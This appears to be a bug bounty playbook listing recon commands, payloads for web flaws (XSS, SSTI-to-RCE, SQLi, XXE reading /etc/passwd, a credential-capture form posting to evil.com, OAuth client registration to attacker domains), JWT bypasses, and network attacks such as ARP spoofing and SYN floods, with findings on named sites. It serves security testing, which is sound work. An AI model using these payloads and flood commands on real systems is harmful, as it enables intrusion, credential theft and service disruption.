
# Web & API Bug Bounty Playbook

## Based on 7 Source Books

| Book | Author | Pages | Focus |
|------|--------|-------|-------|
| Web Hacking 101 | Yaworski | 255 | Real bounty examples (Shopify, Twitter, Google, Yahoo) |
| API Security in Action | Madden | 577 | API injection, auth, JWT, OAuth2, access control |
| Hands on Hacking | Hickey | 611 | Full pentest: OSINT, DNS, VPN, privilege escalation |
| Web Security for Developers | McDonald | 218 | Server-side security, browser internals |
| TCP/IP Illustrated Vol 1 | Stevens/Fall | 1059 | Network protocols, DNS, NAT, firewalls, TLS |
| UNIX Network Programming | Stevens | 1094 | Socket programming, custom tools |
| HTTP Pocket Reference | Wong | 82 | Quick HTTP reference |

---

## PHASE 1: RECON

### Subdomain Enumeration
```bash
# crt.sh CT log search
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Subfinder
subfinder -d target.com -silent

# Amass (deep)
amass enum -d target.com -passive

# HackerTarget
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

# Wayback URLs
curl -s "https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey"

# DNS brute
kf -d target.com -w /usr/share/wordlists/subdomains.txt
```

### Port Scanning
```bash
# Quick scan
nmap -sS -sV --top-ports 1000 target.com

# Full scan
nmap -sS -sV -sC -p- -oA scan target.com

# UDP scan
nmap -sU --top-ports 200 target.com

#Cookie-based service detect
nmap -sV --script=http-headers,http-title -p 80,443 target.com
```

### Tech Fingerprinting
```bash
# Detect stack
whatweb target.com
wappalyzer-cli target.com
builtwith target.com

#CMS detect
cmsmap -u target.com
whatcms.org/api
```

### JS Analysis
```bash
# Extract JS files
cat page.html | grep -oP 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//'

# LinkFinder - extract endpoints from JS
python3 linkfinder.py -i "https://target.com/*.js" -o cli

# SecretFinder - find leaked keys
python3 SecretFinder.py -i https://target.com -o cli

# Source map extract
source-map-explorer webpack-bundle.js
```

### Content Discovery
```bash
# Directory busting
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u https://target.com/FUZZ

# File busting
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u https://target.com/FUZZ

# Gobuster
gobuster dir -u https://target.com -w wordlist.txt -t 50 -x php,asp,jsp,html,json

# robots.txt + sitemap.xml
curl -s target.com/robots.txt
curl -s target.com/sitemap.xml
```

---

## PHASE 2: VULNERABILITY CLASSES

### 1. Open Redirect
```
Look for: redirect_url, next, url, rurl, u, return_to, checkout_url, redirect_to
Test: ?redirect_to=https://evil.com
Trick: ?checkout_url=.evil.com (subdomain concatenation)
Bounty: $500 typical (Shopify, HackerOne examples)
```

### 2. HTTP Parameter Pollution (HPP)
```
Server-side: inject duplicate params, server picks last (PHP) or first (Tomcat)
Test: ?uid=123&uid=456 (try changing user context)
Client-side: ?action=view&action=delete (override behavior)
Bounty: $500-$700 (Twitter, HackerOne examples)
```

### 3. Cross-Site Request Forgery (CSRF)
```
Look for: state-changing GET requests, missing CSRF tokens
Test: <img src="https://target.com/transfer?from=victim&to=attacker&amount=500">
POST CSRF: auto-submit form with hidden inputs + JavaScript onSubmit
Token bypass: check if token validated, try removing token, try null token
Bounty: $100-$852 (Shopify, Instacart, Badoo examples)
```

### 4. HTML Injection
```
Test: Inject <form>, <img>, <iframe> into input fields
Payload: <form action="http://evil.com/capture" method="POST"><input name="user"><input name="pass">
Bounty: $500 (Coinbase, HackerOne examples)
```

### 5. CRLF Injection
```
Test: %0d%0a in URL params to inject headers
Payload: ?url=https://target.com%0d%0aSet-Cookie:evil=1
Response splitting: %0d%0aContent-Length:0%0d%0a%0d%0a<script>alert(1)</script>
Bounty: $500 (Twitter, Shopify examples)
```

### 6. Cross-Site Scripting (XSS)
```
Stored: inject <script>alert(1)</script> in content that gets saved
Reflected: inject in URL params that get reflected in response
DOM: inject in hash (#) or fragments processed by client-side JS
Payloads:
  - <script>alert(document.cookie)</script>
  - <img src=x onerror=alert(1)>
  - "><script>alert(1)</script>
  - javascript:alert(1)
  - {{7*7}} (template injection -> SSTI)
Bypass: <svg/onload=alert(1)>, <body onload=alert(1)>
Bounty: $500-$7500 (Shopify, Yahoo, Google, United Airlines examples)
```

### 7. Server-Side Template Injection (SSTI)
```
Test: {{7*7}} -> if response shows 49, vulnerable
SSTI to RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Frameworks: Jinja2, Twig, Smarty, Angular, Rails
Bounty: $500-$3000 (Uber examples)
```

### 8. SQL Injection
```
Test: ' OR '1'='1, ' UNION SELECT NULL--, ; DROP TABLE--
Blind: ' AND SLEEP(5)-- (time-based)
Tools: sqlmap -u "https://target.com/page?id=1" --dbs --batch
Bounty: $500-$5000 (Drupal, Yahoo, Uber examples)
```

### 9. Server-Side Request Forgery (SSRF)
```
Look for: URL parameters that fetch external resources
Test: ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
Internal scan: ?url=http://localhost:PORT
Blind SSRF: DNS exfil via Burp Collaborator
Bounty: $500-$5000 (ESEA, Google examples)
```

### 10. XML External Entity (XXE)
```
Test: POST XML with external entity
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
Blind: exfil via OOB DNS
Bounty: $500-$5000 (Google, Facebook examples)
```

### 11. Remote Code Execution (RCE)
```
Look for: ImageMagick, deserialization, template engines
ImageMagick: push graphic-context, viewbox gadget
Deserialization: ysoserial payloads
Smarty SSTI RCE: {system('id')}
Bounty: $1000-$20000 (Facebook, Polyvore examples)
```

### 12. Subdomain Takeover
```
Check: CNAME records pointing to dead services (Heroku, GitHub Pages, S3, Zendesk, Fastly)
Tools: subjack, takeov, can-i-takeover-xyz
Check: dig CNAME sub.target.com -> if NXDOMAIN on provider = vulnerable
Bounty: $100-$2000 (Uber, Shopify, Snapchat examples)
```

### 13. Race Conditions
```
Look for: endpoints that should be atomic (invite accept, payment, vote)
Test: send 20 parallel requests via Turbo Intruder or race-the-web
Bounty: $500-$3000 (Starbucks, HackerOne examples)
```

### 14. Insecure Direct Object Reference (IDOR)
```
Look for: /api/users/123, /api/v2/zones?user_id=XXX
Test: increment/change ID, access other users' data
PostgREST: /table?id=eq.X (try filtering other data)
Bounty: $500-$5000 (Binary.com, Twitter MoPub examples)
```

### 15. OAuth Issues
```
Look for: redirect_uri not validated, state param missing/reused
Test: ?redirect_uri=https://evil.com/capture
Token theft: steal authorization code via open redirect chain
Bounty: $500-$5000 (Facebook, Slack, Google examples)
```

### 16. Application Logic Flaws
```
Look for: price manipulation, quantity manipulation, 2FA bypass
Test: negative values, zero quantity, price=0, skip steps in workflow
S3 bucket check: aws s3 ls s3://target-bucket --no-sign-request
Bounty: $500-$5000 (Shopify, GitLab, Yahoo examples)
```

---

## PHASE 3: API-SPECIFIC ATTACKS

### API Authentication Bypass
```
Test: remove Authorization header, send empty Bearer, use JWT with alg:none
JWT manipulation: {"alg":"none"} + base64(payload) + (empty signature)
JWT secret brute: hashcat -m 16500 jwt.txt wordlist.txt
```

### API Rate Limiting
```
Test: send 1000 rapid requests, check if rate limit enforced
Bypass: rotate IPs, change user-agent, add X-Forwarded-For
```

### CORS Wildcard vs Origin Reflection (Critical Distinction)

**Wildcard (Low severity):**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
- Browser blocks wildcard + credentials (spec violation)
- NOT exploitable for credential theft
- Reportable as Low severity (spec violation)

**Origin Reflection (Medium-High severity):**
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
- Browser allows reflected origin + credentials
- EXPLOITABLE for credential theft
- Reportable as Medium-High severity

**Test Command:**
```bash
curl -s -I -H "Origin: https://evil.com" "https://target.com" | grep -i "access-control"
# If ACAO: * → Low (wildcard)
# If ACAO: https://evil.com → Medium-High (reflection)
```

**Found on:** blockpi.network (all subdomains), manageengine.com (wildcard), opencollective.com (wildcard)

### PostHog/Analytics API Key Exposure

**Pattern:** Check HTML source for `posthog.init('phc_...')`.

**Impact:**
- Project key allows event injection (pollute analytics dashboard)
- /decide/ endpoint leaks feature flags, session recording config
- Cannot read data (project key, not personal key)

**PoC:**
```bash
# Send fake event
curl -X POST "https://us.i.posthog.com/capture/" \
  -H "Content-Type: application/json" \
  -d '{"api_key": "phc_...","event":"fake_event","properties":{"distinct_id":"attacker"}}'

# Get feature flags
curl -X POST "https://us.i.posthog.com/decide/" \
  -H "Content-Type: application/json" \
  -d '{"api_key": "phc_...","distinct_id":"attacker"}'
```

**Severity:** Low (analytics pollution, not data exposure)
**Found on:** aurasell.ai ($5 bounty submitted)

### Nuxt.js / Next.js Config Exposure

**Nuxt.js:** Check `window.__NUXT__` and `__NUXT_DATA__` for:
- API keys (Stripe, Sentry, Google Maps)
- Internal URLs (hub.*, ai-assistant.*, contact-zendesk.*)
- Build paths (`/opt/buildhome/repo/...`)

**Next.js:** Check `__NEXT_DATA__` for:
- `buildId` — reveals deployment version
- `env` — environment variables
- `runtimeConfig` — API keys, internal URLs

**Found on:** dashboard.blockpi.io (Stripe key, internal services, build paths)

**HackerOne GraphQL API** — query program scope, bounty eligibility, and asset list programmatically:

```bash
# Query team scope + bounty table (correct field names as of 2026)
curl -s -X POST "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { team(handle: \"PROGRAM_SLUG\") { name handle state submission_state started_accepting_at policy bounty_table { comprehensive_groups { edges { node { assets { edges { node { identifier asset_type instructions eligible_for_bounty } } } } } } } } }"}' \
  | jq .
```

Key fields:
- `state` — "open" = program accepting submissions
- `submission_state` — "open" = submissions accepted
- `bounty_table.comprehensive_groups.edges[].node.assets.edges[].node` — individual assets with `eligible_for_bounty`, `asset_type` (URL/SOURCE_CODE/WILDCARD), `identifier`, `instructions`

**Common field naming gotchas:** HackerOne GraphQL uses snake_case (`submission_state`, `bounty_table`), not camelCase. The API will silently drop fields that don't match — if you get `null` or empty results, your field names are wrong. Use `__schema` introspection if available to discover correct field names.

**HackerOne GraphQL — Alternative query using `bounty_table.ranges` (simpler, confirmed working on MoonPay):**

```bash
curl -s -X POST "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { team(handle: \"PROGRAM_SLUG\") { name handle state submission_state bounty_table { ranges { asset { id asset_type identifier instructions eligible_for_bounty eligible_for_submission } max_bounty } } } }"}' \
  | jq .
```

The `bounty_table.ranges` field returns a flat array of assets with `max_bounty` per asset — simpler than `comprehensive_groups.edges`. Each asset has `identifier` (domain/URL), `asset_type` (URL/WILDCARD/SOURCE_CODE), `eligible_for_bounty`, and `instructions`.

**Immunefi** — redirect-based, no public API. Scrape `immunefi.com/bug-bounty/<slug>/` directly. Check if page renders `__next_error__` (program inactive/paused) vs full content.

**Practical workflow:**
1. `curl -s "https://hackerone.com/PROGRAM" | grep -i "bug bounty"` — confirm program exists
2. GraphQL query for full scope
3. Filter `eligible_for_bounty: true` assets
4. Cross-reference with recon targets
5. Check `instructions` field for program-specific rules (often has scope clarifications)

Found on MoonPay: 15+ in-scope assets including `api.paybox.sh`, `*.moonpay.com`, `github.com/moonpay` (SOURCE_CODE type).
```
ACL: check if /api/spaces/ID allows access to other users' spaces
ABAC: check if attribute-based rules can be bypassed
Capability tokens: check if capability URIs are guessable
```

### API Injection (OWASP API Top 10)
```
API1: Broken Object Level Authorization (IDOR on API)
API2: Broken User Authentication (weak tokens, no rate limit)
API3: Excessive Data Exposure (API returns too much data)
API4: Lack of Rate Limiting
API5: Broken Function Level Authorization (admin endpoints accessible)
API6: Mass Assignment (extra fields in POST body)
API7: Security Misconfiguration (CORS, headers)
API8: Injection (SQLi, NoSQLi, command injection)
API9: Improper Assets Management (old API versions, undocumented endpoints)
API10: Insufficient Logging & Monitoring
```

---

## PHASE 4: NETWORK-LEVEL (TCP/IP Illustrated)

### DNS Attacks
```bash
# Zone transfer
dig AXFR @ns.target.com target.com
# DNS cache snooping
dig @dns.server.com target.com +norecurse
# DNS amplification
dig @resolver target.com ANY +dnssec
# Subdomain brute
fierce -dns target.com
dnsrecon -d target.com -t brte
```

### ARP Spoofing (local network)
```bash
arpspoof -i eth0 -t victim_ip gateway_ip
# Capture traffic
tcpdump -i eth0 host victim_ip
```

### ICMP Attacks
```
Redirect: forge ICMP redirect to intercept traffic
Ping flood: hping3 -1 -flood target.com
Smurf: broadcast ICMP to amplification network
```

### TCP Attacks
```
SYN flood: hping3 -S -p 80 --flood target.com
Reset injection: forge RST to kill connections
Session hijacking: predict sequence numbers
```

### Firewall/NAT Bypass
```
STUN: discover NAT type
TURN: relay through NAT
UPnP: add port mapping via UPnP
PCP: Port Control Protocol
```

---

## PHASE 4b: NEXT.JS & VERCEL-SPECIFIC RECON

### Sentry DSN Leak (Next.js/React)
```bash
# Extract Sentry config from HTML meta tags
curl -s "https://target.com/" | grep -oP 'sentry-public_key=[^,]+'
curl -s "https://target.com/" | grep -oP 'sentry-release=[^,]+'
curl -s "https://target.com/" | grep -oP 'sentry-environment=[^,]+'
curl -s "https://target.com/" | grep -oP 'sentry-org_id=[^,]+'
```
Public key is designed to be client-visible, but can be used to:
- Send fake error events (pollute Sentry dashboard → DoS)
- Read public project info via Sentry API
- Map release versions for targeted attacks
Found on: app.monad.xyz, many Vercel-hosted Next.js apps

### 429 Rate Limit = Real API Route
When fuzzing API paths on Next.js apps, **429 (Too Many Requests)** instead of 404 means the route EXISTS and is protected behind rate limiting.
- 404 = route doesn't exist (or Next.js catch-all)
- 429 = route EXISTS, rate limiter fired before handler
- 200/500 = route exists, handler executed
Always flag 429 endpoints — they are high-value targets for:
- Rate limit bypass: X-Forwarded-For, X-Real-IP rotation, slow delay
- Auth bypass: try without cookies/tokens, different user agents
- Parameter pollution: add extra params to change handler path

### MCP Endpoint Recon (AI Agent Platforms)
Modern AI/agent platforms expose MCP (Model Context Protocol) endpoints. These are a **new bounty surface** (2025-2026):

```bash
# Check for MCP endpoint
curl -sI "https://TARGET/mcp" | grep -i "www-authenticate\|401\|406"
# 401 = MCP exists but needs OAuth
# 406 = MCP exists but needs Accept: text/event-stream

# OAuth discovery for MCP
curl -s "https://TARGET/.well-known/oauth-protected-resource"
curl -s "https://TARGET/.well-known/oauth-authorization-server"

# Connect to MCP (requires Bearer token)
curl -s -X POST "https://TARGET/mcp" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"jsonrpc":"2.0","method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"recon","version":"1.0"}},"id":1}'

# List all MCP tools
curl -s -X POST "https://TARGET/mcp" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"jsonrpc":"2.0","method":"tools/list","params":{},"id":2}'
```

Key MCP attack vectors:
- OAuth token scope escalation (from `mcp` scope to admin)
- Tool injection (register malicious MCP tools)
- Signing bypass (skip passkey/wallet approval for autonomous mode)
- Payment proof forgery (x402 payment proof replay)
- Cross-chain swap manipulation (slippage/recipient tampering)

Reference: PayBox MCP (api.paybox.sh/mcp) — connected successfully with OAuth 2.1, 17 tools discovered including wallet signing, swaps, transfers, virtual card payments, and x402 service marketplace. See `references/paybox-mcp-recon-2026-07-30.md` for full case study.

### OAuth Dynamic Client Registration (DCR) Exploitation

When an OAuth server exposes `/oauth/register` (RFC 7591), test for unauthenticated DCR abuse:

```bash
# Step 1: Check if registration_endpoint exists
curl -s "https://TARGET/.well-known/oauth-authorization-server" | jq .registration_endpoint

# Step 2: Register a client with attacker-controlled redirect_uri (NO AUTH needed)
curl -s -X POST "https://TARGET/oauth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "test",
    "redirect_uris": ["https://attacker.example.com/callback"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"],
    "token_endpoint_auth_method": "none",
    "scope": "mcp offline_access"
  }'
# 200 + client_id = VULNERABLE — attacker can create clients with arbitrary redirect_uri

# Step 3: Verify the registered client triggers redirect to attacker domain
curl -s -o /dev/null -w "%{http_code}|%{redirect_url}" \
  "https://TARGET/oauth/authorize?response_type=code&client_id=NEW_CLIENT_ID&redirect_uri=https://attacker.example.com/callback&scope=mcp&state=test&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URHbuJCDd3xBO0&code_challenge_method=S256"
# 303 redirect to app/paybox with attacker redirect_uri embedded = CONFIRMED

# Step 4: Check for unlimited registration (no rate limit)
for i in 1 2 3 4 5; do
  curl -s -X POST "https://TARGET/oauth/register" -H "Content-Type: application/json" \
    -d "{\"client_name\":\"bot-$i\",\"redirect_uris\":[\"https://evil-$i.example.com/callback\"],\"grant_types\":[\"authorization_code\"],\"response_types\":[\"code\"],\"token_endpoint_auth_method\":\"none\",\"scope\":\"mcp\"}" | jq .client_id
done

# Step 5: Check CORS on token endpoint (compounds with DCR)
curl -sI -X OPTIONS "https://TARGET/oauth/token" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST"
# access-control-allow-credentials: true + reflected ACAO = token theft via browser
```

**Impact:** Attacker registers OAuth client pointing to their domain → crafts phishing link from the legitimate OAuth server domain (e.g. `api.paybox.sh`) → victim trusts the domain, authorizes → authorization code sent to attacker → attacker exchanges for access token → full account/wallet takeover.

**Severity factors:**
- Unauthenticated DCR (no auth to register) = HIGH
- Arbitrary redirect_uri accepted (no whitelist) = HIGH
- No rate limit on registration = MEDIUM (resource abuse, client flooding)
- CORS credentials=true on token endpoint + origin reflection = MEDIUM-HIGH (browser-based token theft)

**Mitigation:** Require authentication for DCR, whitelist redirect_uris, rate-limit registration, lock CORS to known origins only.

---

## PHASE 5: REPORT TEMPLATE

```
## Vulnerability Report: [TITLE]

### Summary
- **Target:** [URL/endpoint]
- **Vulnerability:** [Type]
- **Severity:** [Critical/High/Medium/Low]
- **CVSS:** [score]
- **Date:** [YYYY-MM-DD]

### Description
[2-3 sentences explaining the vulnerability]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Proof of Concept
```
[Include curl command, HTTP request, or code snippet]
```

### Impact
[What an attacker can do - be specific]

### Suggested Fix
[Code-level recommendation]

### References
[OWASP, CVE, or other relevant links]
```

---

## TOOL REFERENCE

| Tool | Purpose | Command |
|------|---------|---------|
| Burp Suite | Intercepting proxy | Community Edition |
| ZAP | OWASP proxy | zap-cli |
| ffuf/gobuster | Dir fuzzing | ffuf -w wordlist -u URL/FUZZ |
| sqlmap | SQLi automation | sqlmap -u URL --dbs |
| nmap | Port scan | nmap -sS -sV target |
| recon-ng | OSINT framework | recon-ng |
| Maltego | Graph recon | maltego |
| Shodan | IoT/host search | shodan search |
| Censys | Internet scan | censys search |
| Knockpy | Subdomain | knockpy target.com |
| Sublist3r | Subdomain | sublist3r -d target.com |
| crt.sh | CT logs | curl crt.sh/?q=target |
| Eyewitness | Screenshot | eyewitness --web |
| XSSHunter | XSS detection | xsshunter.com |
| Turbo Intruder | Race condition | Burp extension |
| Race the Web | Race condition | racetheweb |
| GitRob | Git secrets | gitrob target |
| Nikto | Web scanner | nikto -h target |
| whatweb | Fingerprint | whatweb target |
| Bucket Finder | S3 scan | bucket_finder |
| Ysoserial | Deserialization | java -jar ysoserial.jar |

---

## TIPS FROM THE BOOKS

### Web Hacking 101 (Yaworski)
- "Not all vulnerabilities are complex" — start simple
- "Take note of the services a site uses" — each is a new attack vector
- "If at first you don't succeed, keep digging" — HPP Twitter example
- "Where there is smoke, there is fire" — tokens in JSON? check JS files
- "Include details, then include more" in reports
- "Show respect for the company"
- Recon first, then test systematically

### API Security in Action (Madden)
- OWASP API Top 10 is the baseline, not the ceiling
- Injection can happen in SQL, LDAP, OS commands, HTTP, HTML
- Authentication = who you are; Authorization = what you can do
- Rate limiting is a security mechanism, not just performance
- HTTPS protects in transit; encrypt sensitive data at rest too
- JWT alg:none is a classic bypass
- Capability tokens > ACLs for fine-grained access

### Hands on Hacking (Hickey)
- Authorization is the #1 rule — never hack without permission
- Bug bounty programs = legal hacking pathway
- Kali Linux is the standard pentest OS
- Always document findings as you go
- Reports make or break your bounty — write professionally
